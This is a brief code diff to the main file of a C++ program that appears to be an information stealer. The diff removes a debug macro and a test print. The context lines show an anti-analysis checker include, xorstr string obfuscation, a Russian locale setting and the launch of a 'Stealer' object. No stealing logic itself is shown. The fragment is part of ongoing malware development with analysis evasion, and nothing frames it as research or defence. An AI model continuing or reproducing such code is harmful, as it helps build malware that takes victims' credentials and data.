@@ -7,8 +7,6 @@
 #include "antianalysis/AntiAnalysisChecker.h"
 #endif
 
-#define prepare(str) (std::string(str) + "1")
-
 void globalExceptionHandler() {
     try {
         throw;
@@ -39,9 +37,6 @@ int main() {
 
     std::locale::global(std::locale(""));
     setlocale(LC_ALL, xorstr_("ru-RU"));
-
-    std::string str = prepare("Some string");
-    std::cout << str << std::endl;
 
     Stealer stealer;
     stealer.run();
